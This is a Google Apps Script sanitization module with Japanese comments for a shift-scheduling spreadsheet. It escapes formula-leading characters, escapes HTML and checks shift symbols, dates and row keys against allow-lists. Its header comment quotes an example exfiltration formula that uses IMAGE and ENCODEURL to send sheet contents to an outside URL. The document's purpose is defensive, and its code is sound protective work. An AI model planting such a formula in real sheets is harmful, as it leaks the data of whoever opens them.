/**
 * Sanitize.gs — 入ってくる値を、置く場所に応じて無害にする
 *
 * 仕様: docs/DEPLOY-PLAN.md §1
 *
 * ## シートに書く値は、データではなくコードになりうる
 *
 * この移植に SQL は無いので SQL インジェクションは起こらない。だが
 * 「SQL インジェクションと等価」では言葉が弱い。**スプレッドシートのほうが危ない。**
 * 理由は5つある。
 *
 * 1. **実行主体が閲覧者になる。** セルの数式は、書いた人ではなく **開いた人の権限で**
 *    動く。`=IMPORTRANGE("...","A1")` は、そのシートを開いた店長のアカウントで
 *    他のシートを読みに行く。攻撃者本人が持っていない権限が使われる。
 * 2. **起動に操作が要らない。** バイナリは保存して実行しなければ動かない。数式は
 *    **開いた瞬間に評価される。** 再計算のたびに何度でも動く。
 * 3. **黙って外へ送れる。**
 *    `=IMAGE("https://…/?d="&ENCODEURL(JOIN(",",A1:Z99)))`
 *    は画像を描画するふりをして中身を送る。クリックも警告も要らない。
 * 4. **残り続け、複製される。** セルに居座り、Backup.gs の控えにも、PDF/xlsx の
 *    書き出しにも入る。xlsx を Excel で開けば Excel 側でも動く。
 * 5. **見た目で気づけない。** セルは計算結果しか表示しない。無害な文字列に見える。
 *
 * つまりシートは「データ置き場」ではなく **実行環境**である。入力を置く以上、
 * 置いてよい形に直してから置く。
 *
 * ## この構成で実際に起きる不正
 *
 *   1. 権限の詐称 … 画面から来た店舗 ID を信じてしまう（Auth.gs）
 *   2. 数式インジェクション … 上のとおり（← ここ）
 *   3. 反射 XSS … エラー文をそのまま HTML に埋める（WebApp.gs doGet）
 *
 * 画面側（prototype/ShiftGrid.html）は innerHTML を1か所も使わず textContent だけで
 * 書いているので、そちらの XSS 面はもともと無い。用心が要るのはサーバ側。
 *
 * ## 多層で守る
 *
 *   書くとき  … cellSafe_ で数式化を止める（この層だけに頼らない）
 *   列の書式  … 入力列は表示形式を「書式なしテキスト」にする（setNumberFormat('@')）
 *   読むとき  … assertNoFormulas_ で、入力欄に数式が居座っていないか確かめる
 *   値の検証  … 記号・行キー・年月日は許可リストと突き合わせる
 */

const MODULE_SANITIZE = 'Sanitize';

/** セルに置いたとき数式として解釈される先頭文字 */
const FORMULA_LEADS = Object.freeze(['=', '+', '-', '@']);

/**
 * 数式の合図になる制御文字（タブ・CR・LF）。
 * ソースに生の制御文字を書かないよう、必ずエスケープで表す。
 */
const FORMULA_LEAD_CTRL = Object.freeze(['\t', '\r', '\n']);

/** 落とす制御文字。C0 全部と DEL */
const CTRL_CHARS = /[\u0000-\u001F\u007F]/g;

/** Sheets の1セルは 50,000 文字まで */
const CELL_MAX_LEN = 50000;

/**
 * セルに書いてよい文字列にする。**setValues の前に必ず通す。**
 *
 * 数式になる先頭文字が来たら、前に `'` を足して文字列に固定する。
 * Sheets は先頭の `'` を表示しないので、見た目は変わらない。
 *
 * ★ 消すのではなく無効化する。`-1` や `+81…` のような正当な入力を壊さないため。
 *
 * @param {*} v 入ってきた値
 * @return {string|number|boolean|Date} セルに書いてよい値
 */
function cellSafe_(v) {
  if (v === null || v === undefined) return '';
  if (typeof v === 'number' || typeof v === 'boolean') return v;   // 数値・真偽はそのまま
  if (v instanceof Date) return v;

  let s = String(v).replace(CTRL_CHARS, '');
  if (s.length > CELL_MAX_LEN) s = s.slice(0, CELL_MAX_LEN);
  if (s === '') return '';

  const head = s.charAt(0);
  if (FORMULA_LEADS.indexOf(head) >= 0 || FORMULA_LEAD_CTRL.indexOf(head) >= 0) {
    return "'" + s;
  }
  return s;
}

/** 二次元配列をまとめて通す。setValues の直前で使う */
function cellSafeGrid_(rows) {
  return (rows || []).map(row => (row || []).map(cellSafe_));
}

/**
 * その文字列は、セルに置いたら数式になるか。
 * 読み出し側の点検に使う（書き込み側は cellSafe_）。
 */
function looksLikeFormula_(v) {
  if (v === null || v === undefined) return false;
  const s = String(v);
  if (s === '') return false;
  const head = s.charAt(0);
  return FORMULA_LEADS.indexOf(head) >= 0 || FORMULA_LEAD_CTRL.indexOf(head) >= 0;
}

/**
 * 入力欄に数式が居座っていないか確かめる。
 *
 * cellSafe_ を通さない経路（人が直接シートに書く、Excel から取り込む、
 * 過去のデータ）からは数式が入りうる。**書く前に守るだけでは足りない。**
 *
 * @param {Array<Array<string>>} formulas getFormulas() の返り値
 * @param {string} where 見つけたときにログへ出す場所の名前
 * @return {Array<Object>} 見つかった位置。空なら問題なし
 */
function findFormulas_(formulas, where) {
  const hits = [];
  (formulas || []).forEach((row, r) => {
    (row || []).forEach((f, c) => {
      if (f) hits.push({ row: r, col: c, formula: String(f).slice(0, 120) });
    });
  });
  if (hits.length) {
    console.error(`[${MODULE_SANITIZE}.findFormulas_] ${where}: `
      + `入力欄に数式が ${hits.length} 件あります。先頭: ${JSON.stringify(hits[0])}`);
  }
  return hits;
}

/** 見つけたら止める版。取り込みの入口で使う */
function assertNoFormulas_(formulas, where) {
  const hits = findFormulas_(formulas, where);
  if (hits.length) {
    throw new Error(`${where} の入力欄に数式が ${hits.length} 件あります。`
      + '取り込みを中止しました');
  }
  return true;
}

/**
 * HTML に埋めてよい文字列にする。
 * 属性値にも本文にも使えるよう、引用符も落とす。
 */
function escapeHtml_(v) {
  return String(v === null || v === undefined ? '' : v)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#39;');
}

/**
 * 画面から来た「シフト記号」を、マスタにあるものだけに絞る。
 *
 * 記号は自由入力ではない。**マスタに無い値は書かない。**
 * 許可リストで通すと、記号の欄から数式や長文が入る道が塞がる。
 * cellSafe_ より強い守り方なので、形が決まっている欄はこちらを使う。
 *
 * @param {string} sym 画面から来た記号
 * @param {Array<string>} allowed シフトパターンマスタにある記号
 * @return {string} 通った記号。空欄（消す操作）は '' で通す
 */
function requireSymbol_(sym, allowed) {
  const s = String(sym === null || sym === undefined ? '' : sym).trim();
  if (s === '') return '';                          // 消す操作は許す
  if ((allowed || []).indexOf(s) < 0) {
    console.error(`[${MODULE_SANITIZE}.requireSymbol_] 未登録の記号: ${JSON.stringify(s)}`);
    throw new Error('登録されていない記号です');
  }
  return s;
}

/**
 * 画面から来た年月を、扱える範囲に収める。
 * 範囲外を黙って丸めず、例外にする（丸めると別の月を書いてしまう）。
 */
function requireYearMonth_(y, m) {
  const yy = Number(y);
  const mm = Number(m);
  if (!Number.isInteger(yy) || yy < 2019 || yy > 2100) {
    throw new Error(`扱えない年です: ${y}`);
  }
  if (!Number.isInteger(mm) || mm < 1 || mm > 12) {
    throw new Error(`扱えない月です: ${m}`);
  }
  return { year: yy, month: mm };
}

/**
 * 画面から来た日を、その月に実在する日に絞る。
 * 2月30日のような日を書かせない。
 */
function requireDay_(year, month, day) {
  const d = Number(day);
  const last = new Date(year, month, 0).getDate();
  if (!Number.isInteger(d) || d < 1 || d > last) {
    throw new Error(`${year}年${month}月に ${day} 日はありません`);
  }
  return d;
}

/**
 * 画面から来た「行のキー」を、その月に実在する行だけに絞る。
 *
 * 画面は '<行キー>|yyyy-mm|日' でセルを指す。行キーをそのまま信じると、
 * 医師欄のつもりで集計行を書き換えるといった取り違えが起きる。
 * **書ける行の一覧と突き合わせてから使う。**
 */
function requireRowKey_(key, allowedKeys) {
  const k = String(key === null || key === undefined ? '' : key).trim();
  if (k === '' || (allowedKeys || []).indexOf(k) < 0) {
    console.error(`[${MODULE_SANITIZE}.requireRowKey_] 未知の行: ${JSON.stringify(k)}`);
    throw new Error('書き込めない行が指定されました');
  }
  return k;
}
